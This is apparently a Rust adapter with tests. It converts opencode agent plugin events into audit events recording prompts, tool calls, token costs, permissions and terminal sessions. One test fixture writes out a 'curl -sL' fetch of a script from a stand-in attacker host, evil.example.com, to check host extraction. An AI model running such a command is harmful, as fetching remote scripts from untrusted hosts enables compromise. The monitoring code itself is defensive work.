use crate::config::CaptureCfg;
use crate::event::{Envelope, Event, EventKind};
use serde_json::Value;

pub fn parse(env: &Envelope, capture: &CaptureCfg) -> Vec<Event> {
    let p = &env.payload;
    let session_id = p
        .get("sessionID")
        .and_then(Value::as_str)
        .or_else(|| p.pointer("/properties/sessionID").and_then(Value::as_str))
        .map(String::from);
    let cwd = p.get("cwd").and_then(Value::as_str).map(String::from);
    let mk = |kind| Event::new("opencode", session_id.clone(), cwd.clone(), kind);
    let event = p.get("event").and_then(Value::as_str).unwrap_or("");
    let max = capture.max_field_bytes;
    let props = p.get("properties").cloned().unwrap_or(Value::Null);

    match event {
        "chat.message" => {
            let role = p
                .pointer("/message/role")
                .and_then(Value::as_str)
                .unwrap_or("");
            let joined = |cap: bool| -> String {
                if !cap {
                    return "[not captured]".into();
                }
                crate::adapters::cap_text(
                    &p.get("parts")
                        .and_then(Value::as_array)
                        .map(|parts| {
                            parts
                                .iter()
                                .filter_map(|part| part.get("text").and_then(Value::as_str))
                                .collect::<Vec<_>>()
                                .join("\n")
                        })
                        .unwrap_or_default(),
                    max,
                )
            };
            match role {
                "user" => vec![mk(EventKind::Prompt {
                    text: joined(capture.prompts),
                })],
                "assistant" if capture.assistant_messages => {
                    vec![mk(EventKind::AssistantMessage { text: joined(true) })]
                }
                _ => vec![],
            }
        }
        "tool.execute.before" | "tool.execute.after" => {
            let tool = p
                .get("tool")
                .and_then(Value::as_str)
                .unwrap_or("unknown")
                .to_string();
            let args = p.get("args").cloned().unwrap_or(Value::Null);
            let files = crate::adapters::extract_files_for_tool(&tool, &args);
            let fqdns = crate::adapters::extract_net_for_tool(&tool, &args);
            let phase = if event.ends_with("before") {
                "pre"
            } else {
                "post"
            }
            .to_string();
            let input = if capture.tool_inputs {
                crate::adapters::cap_value(args, max)
            } else {
                Value::Null
            };
            let output = if event.ends_with("after") && capture.tool_outputs {
                crate::adapters::cap_value(p.get("result").cloned().unwrap_or(Value::Null), max)
            } else {
                Value::Null
            };
            let mut ev = mk(EventKind::ToolUse {
                tool,
                phase,
                input,
                output,
                error: None,
                // opencode's plugin events carry neither.
                duration_ms: None,
                interrupted: false,
                files,
                fqdns,
                file_contents: vec![],
            });
            // The plugin has always sent this and the adapter has always
            // dropped it. It is the only thing that pairs the `before` with
            // the `after`: two `bash` calls in a turn are otherwise
            // indistinguishable, so a call that hung — a `pre` whose `post`
            // never arrived — could not be told from one that finished.
            ev.meta.tool_use_id = p.get("callID").and_then(Value::as_str).map(String::from);
            vec![ev]
        }
        // One per finished assistant turn — the plugin drops the streaming
        // updates, so anything arriving here is final.
        "message.updated" => {
            let n = |ptr: &str| p.pointer(ptr).and_then(Value::as_u64).unwrap_or(0);
            let mut ev = mk(EventKind::Usage {
                input_tokens: n("/tokens/input"),
                output_tokens: n("/tokens/output"),
                reasoning_tokens: n("/tokens/reasoning"),
                cache_read_tokens: n("/tokens/cache/read"),
                cache_write_tokens: n("/tokens/cache/write"),
                cost: p.get("cost").and_then(Value::as_f64).unwrap_or(0.0),
                finish: p.get("finish").and_then(Value::as_str).map(String::from),
            });
            // Qualified with the provider, because a bare `modelID` is not
            // unique: the same name is served by more than one provider, and
            // which one saw the turn is the whole question a policy about
            // third-party models is asking.
            ev.meta.model = match (
                p.get("providerID").and_then(Value::as_str),
                p.get("modelID").and_then(Value::as_str),
            ) {
                (Some(provider), Some(model)) => Some(format!("{provider}/{model}")),
                (None, Some(model)) => Some(model.to_string()),
                _ => None,
            };
            ev.meta.turn_id = p.get("messageID").and_then(Value::as_str).map(String::from);
            vec![ev]
        }
        // opencode has two permission events, not three. `permission.updated`
        // *is* the ask — it carries the whole `Permission`: the tool type, the
        // pattern it matched, and the call it gates. `permission.replied`
        // carries the answer. There was a third arm here for
        // `permission.asked`, which opencode has never emitted, and it held
        // the only mapping to `requested` — so a query for permission requests
        // on opencode matched nothing, while the events that were the requests
        // came through labelled `updated`.
        "permission.replied" | "permission.updated" => {
            let action = if event == "permission.replied" {
                "replied"
            } else {
                "requested"
            };
            let mut ev = mk(EventKind::Permission {
                tool: props
                    .get("type")
                    .and_then(Value::as_str)
                    .unwrap_or("unknown")
                    .into(),
                action: action.into(),
                input: crate::adapters::cap_value(props.clone(), max),
            });
            // Same id the tool events carry, so the prompt and the call it
            // gated are one join rather than a guess from adjacency. Only the
            // ask has it; a reply names the permission, not the call.
            ev.meta.tool_use_id = props
                .get("callID")
                .and_then(Value::as_str)
                .map(String::from);
            vec![ev]
        }
        // A pty is a process, and it becomes a `ToolUse` rather than a
        // `Session` note for one reason: "what did this session run" has to be
        // one query. A pty that landed in `Session.detail` would be a command
        // execution invisible to every query about command executions — which
        // is the shape of hole worth forwarding it to close in the first place.
        //
        // `pre`/`post` for created/exited, so it pairs the way tool calls do,
        // through `meta.tool_use_id`. `pty.exited` carries no `sessionID` —
        // only the pty's own id — so that id is the whole join.
        "pty.created" | "pty.exited" => {
            let phase = if event == "pty.created" {
                "pre"
            } else {
                "post"
            };
            // `pty.created` wraps the whole `Pty` in `info`; `pty.exited`
            // reports `id` and `exitCode` flat. One shape from here down.
            let props = props.get("info").unwrap_or(&props).clone();
            // The command and its args as one line, purely so the FQDN
            // extractor sees what was actually invoked: opencode splits the
            // program from its arguments, and a host named in `args` is
            // invisible to a scan of `command` alone.
            let line = {
                let mut s = props
                    .get("command")
                    .and_then(Value::as_str)
                    .unwrap_or_default()
                    .to_string();
                for a in props
                    .get("args")
                    .and_then(Value::as_array)
                    .into_iter()
                    .flatten()
                {
                    if let Some(a) = a.as_str() {
                        s.push(' ');
                        s.push_str(a);
                    }
                }
                s
            };
            let fqdns = crate::adapters::extract_net_for_tool(
                "pty",
                &serde_json::json!({
                    "command": line,
                }),
            );
            // Non-zero is a failure, and 0 is not: an absent code is neither,
            // which is what `pty.created` has.
            let error = props
                .get("exitCode")
                .and_then(Value::as_i64)
                .filter(|c| *c != 0)
                .map(|c| format!("exit status {c}"));
            let mut ev = mk(EventKind::ToolUse {
                tool: "pty".into(),
                phase: phase.into(),
                input: if capture.tool_inputs {
                    crate::adapters::cap_value(props.clone(), max)
                } else {
                    Value::Null
                },
                output: Value::Null,
                error,
                // opencode reports neither the duration nor an interrupt.
                duration_ms: None,
                interrupted: false,
                files: vec![],
                fqdns,
                file_contents: vec![],
            });
            ev.meta.tool_use_id = props.get("id").and_then(Value::as_str).map(String::from);
            vec![ev]
        }
        "file.edited" | "file.watcher.updated" => {
            let path = props
                .get("file")
                .or_else(|| props.get("path"))
                .and_then(Value::as_str)
                .unwrap_or_default()
                .to_string();
            let action = if event == "file.edited" {
                "edited"
            } else {
                "watcher_updated"
            };
            vec![mk(EventKind::FileChange {
                path,
                action: action.into(),
            })]
        }
        "command.executed" => vec![mk(EventKind::Skill {
            name: props
                .get("command")
                .and_then(Value::as_str)
                .unwrap_or("unknown")
                .into(),
            args: props
                .get("arguments")
                .and_then(Value::as_str)
                .map(String::from),
        })],
        e if e.starts_with("session.")
            || e == "todo.updated"
            || e == "server.connected"
            || e == "installation.updated"
            // A message deleted from a live session: the transcript is the
            // record, and this is the only notice part of it stopped existing.
            || e == "message.removed"
            // Which branch the session's `cwd` was on. A file edit means one
            // thing on a topic branch and another on the release branch, and
            // nothing else reports the difference.
            || e == "vcs.branch.updated" =>
        {
            vec![mk(EventKind::Session {
                action: event.into(),
                detail: crate::adapters::cap_value(props.clone(), max),
            })]
        }
        _ => vec![mk(EventKind::Raw { payload: p.clone() })],
    }
}

#[cfg(test)]
mod tests {
    use crate::adapters;
    use crate::config::CaptureCfg;
    use crate::event::{Envelope, EventKind};
    use serde_json::json;

    fn env(payload: serde_json::Value) -> Envelope {
        Envelope {
            cloud_identity: Default::default(),
            source: "opencode".into(),
            received_at: chrono::Utc::now(),
            truncated: false,
            dropped: 0,
            event: None,
            payload,
        }
    }

    #[test]
    fn user_message_becomes_prompt() {
        let events = adapters::parse(
            env(json!({
                "event": "chat.message", "sessionID": "oc1",
                "message": {"role": "user"}, "parts": [{"type": "text", "text": "add tests"}]
            })),
            &CaptureCfg::default(),
        );
        assert!(matches!(&events[0].kind, EventKind::Prompt { text } if text == "add tests"));
        assert_eq!(events[0].session_id.as_deref(), Some("oc1"));
    }

    #[test]
    fn tool_execute_maps_files_and_fqdns() {
        let events = adapters::parse(
            env(json!({
                "event": "tool.execute.before", "sessionID": "oc1",
                "tool": "write", "args": {"filePath": "/repo/x.ts", "content": "..."}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::ToolUse { tool, files, .. } = &events[0].kind else {
            panic!()
        };
        assert_eq!(tool, "write");
        assert_eq!(files, &vec!["/repo/x.ts".to_string()]);

        let events = adapters::parse(
            env(json!({
                "event": "tool.execute.before", "tool": "bash",
                "args": {"command": "curl https://registry.npmjs.org/x"}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::ToolUse { fqdns, .. } = &events[0].kind else {
            panic!()
        };
        assert_eq!(fqdns, &vec!["registry.npmjs.org".to_string()]);
    }

    /// Every other harness reports where the session is running; opencode
    /// reported `null`, which silently excluded its events from anything
    /// scoped to a repository.
    #[test]
    fn events_carry_the_working_directory_the_plugin_reports() {
        for payload in [
            json!({"event": "chat.message", "cwd": "/repo",
                   "message": {"role": "user"}, "parts": [{"text": "hi"}]}),
            json!({"event": "tool.execute.before", "cwd": "/repo", "tool": "bash",
                   "args": {"command": "ls"}}),
            json!({"event": "session.error", "cwd": "/repo", "properties": {}}),
        ] {
            let events = adapters::parse(env(payload.clone()), &CaptureCfg::default());
            assert_eq!(events[0].cwd.as_deref(), Some("/repo"), "payload {payload}");
        }
    }

    /// The `before` and the `after` of one call are otherwise
    /// indistinguishable from a second call of the same tool in the same turn,
    /// so without this there is no duration and no way to spot a call whose
    /// `after` never arrived.
    #[test]
    fn tool_events_keep_the_call_id_that_pairs_them() {
        let ids: Vec<_> = ["tool.execute.before", "tool.execute.after"]
            .iter()
            .map(|event| {
                let events = adapters::parse(
                    env(json!({"event": event, "sessionID": "oc1", "tool": "bash",
                               "callID": "call_7", "args": {"command": "ls"}})),
                    &CaptureCfg::default(),
                );
                events[0].meta.tool_use_id.clone()
            })
            .collect();
        assert_eq!(
            ids,
            vec![Some("call_7".into()), Some("call_7".into())],
            "both legs must carry the same id"
        );
    }

    /// opencode is the only harness that reports what a turn cost. The plugin
    /// forwards it and this is where it stops being a JSON blob: summing spend
    /// per session has to be a query, not a parse.
    #[test]
    fn a_finished_assistant_turn_becomes_a_usage_event() {
        let events = adapters::parse(
            env(json!({
                "event": "message.updated", "sessionID": "oc1",
                "messageID": "msg_1", "modelID": "claude-opus-5",
                "providerID": "anthropic", "cost": 0.0421, "finish": "stop",
                "tokens": {"input": 120, "output": 31, "reasoning": 9,
                           "cache": {"read": 98, "write": 12}}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::Usage {
            input_tokens,
            output_tokens,
            reasoning_tokens,
            cache_read_tokens,
            cache_write_tokens,
            cost,
            finish,
        } = &events[0].kind
        else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!(
            (
                *input_tokens,
                *output_tokens,
                *reasoning_tokens,
                *cache_read_tokens,
                *cache_write_tokens
            ),
            (120, 31, 9, 98, 12)
        );
        assert_eq!(*cost, 0.0421);
        assert_eq!(finish.as_deref(), Some("stop"));
        // Provider-qualified: the same model name is served by more than one
        // provider, and which one saw the turn is the question a policy about
        // third-party models is asking.
        assert_eq!(
            events[0].meta.model.as_deref(),
            Some("anthropic/claude-opus-5")
        );
        assert_eq!(events[0].meta.turn_id.as_deref(), Some("msg_1"));
    }

    /// A provider that omits a leg must not make the whole receipt vanish —
    /// the counts that did arrive are still worth having.
    #[test]
    fn usage_survives_a_payload_missing_every_optional_field() {
        let events = adapters::parse(
            env(json!({"event": "message.updated", "sessionID": "oc1"})),
            &CaptureCfg::default(),
        );
        let EventKind::Usage {
            input_tokens,
            cost,
            finish,
            ..
        } = &events[0].kind
        else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!(*input_tokens, 0);
        assert_eq!(*cost, 0.0);
        assert!(finish.is_none());
        assert!(events[0].meta.model.is_none());
    }

    #[test]
    fn non_user_non_assistant_message_is_ignored() {
        let events = adapters::parse(
            env(json!({
                "event": "chat.message", "sessionID": "oc1",
                "message": {"role": "system"}, "parts": [{"type": "text", "text": "hi"}]
            })),
            &CaptureCfg::default(),
        );
        assert!(events.is_empty());
    }

    #[test]
    fn capture_flags_suppress_content() {
        let cfg = CaptureCfg {
            prompts: false,
            tool_inputs: false,
            ..CaptureCfg::default()
        };
        let events = adapters::parse(
            env(json!({
                "event": "chat.message", "message": {"role": "user"},
                "parts": [{"type": "text", "text": "secret"}]
            })),
            &cfg,
        );
        let EventKind::Prompt { text } = &events[0].kind else {
            panic!()
        };
        assert_eq!(text, "[not captured]");

        let events = adapters::parse(
            env(json!({
                "event": "tool.execute.before", "tool": "write",
                "args": {"filePath": "/a.ts", "content": "secret"}
            })),
            &cfg,
        );
        let EventKind::ToolUse { input, files, .. } = &events[0].kind else {
            panic!()
        };
        assert!(input.is_null());
        assert_eq!(files.len(), 1, "metadata still extracted");
    }

    #[test]
    fn assistant_message_is_captured() {
        let events = adapters::parse(
            env(json!({
                "event": "chat.message", "sessionID": "oc1",
                "message": {"role": "assistant"},
                "parts": [{"type": "text", "text": "All tests pass."}]
            })),
            &CaptureCfg::default(),
        );
        assert!(matches!(&events[0].kind,
            EventKind::AssistantMessage { text } if text == "All tests pass."));
    }

    #[test]
    fn assistant_message_respects_capture_flag() {
        let cfg = CaptureCfg {
            assistant_messages: false,
            ..CaptureCfg::default()
        };
        let events = adapters::parse(
            env(
                json!({"event": "chat.message", "message": {"role": "assistant"},
                       "parts": [{"type": "text", "text": "secret"}]}),
            ),
            &cfg,
        );
        assert!(events.is_empty());
    }

    #[test]
    fn tool_execute_after_captures_result() {
        let events = adapters::parse(
            env(json!({
                "event": "tool.execute.after", "sessionID": "oc1", "tool": "bash",
                "result": {"title": "ls", "output": "a.ts\nb.ts", "metadata": {}}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::ToolUse { phase, output, .. } = &events[0].kind else {
            panic!()
        };
        assert_eq!(phase, "post");
        assert_eq!(output["output"], "a.ts\nb.ts");
    }

    #[test]
    fn file_edited_maps_to_file_change() {
        let events = adapters::parse(
            env(json!({"event": "file.edited", "sessionID": "oc1",
                       "properties": {"file": "/repo/src/app.ts"}})),
            &CaptureCfg::default(),
        );
        assert!(matches!(&events[0].kind,
            EventKind::FileChange { path, action } if path == "/repo/src/app.ts" && action == "edited"));
    }

    #[test]
    fn command_executed_maps_to_skill() {
        let events = adapters::parse(
            env(json!({"event": "command.executed", "sessionID": "oc1",
                       "properties": {"command": "commit", "arguments": "-m fix"}})),
            &CaptureCfg::default(),
        );
        assert!(matches!(&events[0].kind,
            EventKind::Skill { name, .. } if name == "commit"));
    }

    #[test]
    fn session_bus_events_map_to_session_kind() {
        for event in ["session.error", "session.compacted", "session.deleted"] {
            let events = adapters::parse(
                env(json!({"event": event, "sessionID": "oc1", "properties": {"x": 1}})),
                &CaptureCfg::default(),
            );
            assert!(
                matches!(&events[0].kind,
                    EventKind::Session { action, .. } if action == event),
                "event {event}"
            );
        }
    }

    #[test]
    fn session_and_unknown_events_map() {
        let events = adapters::parse(
            env(json!({"event": "session.created", "sessionID": "s"})),
            &CaptureCfg::default(),
        );
        assert!(
            matches!(&events[0].kind, EventKind::Session { action, .. } if action == "session.created")
        );
        let events = adapters::parse(
            env(json!({"event": "mystery.event"})),
            &CaptureCfg::default(),
        );
        assert!(matches!(&events[0].kind, EventKind::Raw { .. }));
    }

    /// A pty is a command with a pid that never passes through
    /// `tool.execute.*`, so it is the one way to run something and leave no
    /// trace in the tool record. It becomes a `ToolUse` for that reason: as a
    /// `Session` note it would be a command execution invisible to every
    /// query about command executions.
    #[test]
    fn a_terminal_is_a_tool_call_with_a_pid() {
        let events = adapters::parse(
            env(json!({
                "event": "pty.created", "sessionID": "oc1", "cwd": "/repo",
                "properties": {"info": {
                    "id": "pty_1", "title": "shell", "command": "curl",
                    "args": ["-sL", "https://evil.example.com/x.sh"],
                    "cwd": "/repo", "status": "running", "pid": 4242
                }}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::ToolUse {
            tool,
            phase,
            input,
            fqdns,
            error,
            ..
        } = &events[0].kind
        else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!((tool.as_str(), phase.as_str()), ("pty", "pre"));
        assert_eq!(input["pid"], 4242);
        // The host is in `args`, not in `command`: opencode splits the program
        // from its arguments, so scanning `command` alone finds nothing.
        assert_eq!(fqdns, &vec!["evil.example.com".to_string()]);
        assert!(error.is_none());
        assert_eq!(events[0].meta.tool_use_id.as_deref(), Some("pty_1"));
        // The session's, not the pty's — a terminal is not a session.
        assert_eq!(events[0].session_id.as_deref(), Some("oc1"));

        // `pty.exited` reports its fields flat, and carries no sessionID at
        // all: the pty id is the whole join back to the `created`.
        let events = adapters::parse(
            env(json!({
                "event": "pty.exited",
                "properties": {"id": "pty_1", "exitCode": 137}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::ToolUse { phase, error, .. } = &events[0].kind else {
            panic!()
        };
        assert_eq!(phase, "post");
        assert_eq!(error.as_deref(), Some("exit status 137"));
        assert_eq!(events[0].meta.tool_use_id.as_deref(), Some("pty_1"));

        // Zero is not a failure. An absent code is neither, which is what
        // `pty.created` has — asserted above.
        let events = adapters::parse(
            env(json!({"event": "pty.exited", "properties": {"id": "p", "exitCode": 0}})),
            &CaptureCfg::default(),
        );
        let EventKind::ToolUse { error, .. } = &events[0].kind else {
            panic!()
        };
        assert!(error.is_none());
    }

    /// `permission.updated` is opencode's ask — the event carrying the tool
    /// type, the pattern and the call being gated. It used to arrive labelled
    /// `updated` while `requested` was reserved for an event that never fires.
    #[test]
    fn the_permission_ask_is_labelled_a_request() {
        let events = adapters::parse(
            env(json!({
                "event": "permission.updated", "sessionID": "oc1",
                "properties": {"id": "per_1", "type": "bash", "callID": "call_7",
                               "pattern": "git push *", "sessionID": "oc1"}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::Permission { tool, action, .. } = &events[0].kind else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!((tool.as_str(), action.as_str()), ("bash", "requested"));
        // The join back to the tool call the prompt gated.
        assert_eq!(events[0].meta.tool_use_id.as_deref(), Some("call_7"));

        let events = adapters::parse(
            env(json!({
                "event": "permission.replied", "sessionID": "oc1",
                "properties": {"permissionID": "per_1", "response": "reject"}
            })),
            &CaptureCfg::default(),
        );
        let EventKind::Permission { action, .. } = &events[0].kind else {
            panic!()
        };
        assert_eq!(action, "replied");
        // A reply names the permission, not the call.
        assert!(events[0].meta.tool_use_id.is_none());
    }

    /// The plugin decides what crosses the socket; this file decides what it
    /// becomes. Nothing made the two agree, and they drifted in the direction
    /// that is hardest to notice: `permission.asked` had an entry in
    /// `BUS_FORWARD`, an arm here, and a fixture, and opencode has never
    /// emitted it. Three consistent artefacts, all fictional.
    ///
    /// Falling to `Raw` is the failure this catches — a forwarded event with
    /// no arm is not lost, it just arrives as an unqueryable blob, which looks
    /// like coverage in every report that counts events.
    #[test]
    fn every_forwarded_bus_event_has_an_arm() {
        let shim = crate::harness::opencode::shim_source();
        let (_, rest) = shim.split_once("const BUS_FORWARD = new Set([").unwrap();
        let (body, _) = rest.split_once("]);").unwrap();
        let names: Vec<&str> = body
            .lines()
            .filter_map(|l| l.trim().trim_end_matches(',').strip_prefix('"'))
            .filter_map(|l| l.strip_suffix('"'))
            .collect();
        assert!(names.len() > 10, "parsed {names:?} — the literal moved");
        for name in names {
            let events = adapters::parse(
                env(json!({"event": name, "sessionID": "s", "properties": {}})),
                &CaptureCfg::default(),
            );
            assert!(
                !events.is_empty() && !matches!(&events[0].kind, EventKind::Raw { .. }),
                "{name} is forwarded but has no arm — it lands in raw"
            );
        }
    }

    #[test]
    fn tool_execute_after_maps_to_post_phase() {
        let events = adapters::parse(
            env(json!({"event": "tool.execute.after", "tool": "bash"})),
            &CaptureCfg::default(),
        );
        let EventKind::ToolUse { phase, .. } = &events[0].kind else {
            panic!()
        };
        assert_eq!(phase, "post");
    }
}
